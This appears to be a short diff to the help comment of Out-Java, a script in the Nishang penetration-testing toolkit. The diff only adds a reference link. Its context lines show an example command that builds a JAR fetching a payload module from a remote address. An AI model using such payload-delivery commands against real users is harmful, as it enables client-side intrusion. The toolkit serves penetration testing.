@@ -65,6 +65,7 @@ PS > Out-Java -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check
 Due to the use of -NoSelfSign in above command, no self signed certificate would be used to sign th JAR.
 
 .LINK
+http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
 https://github.com/samratashok/nishang
 #>
 
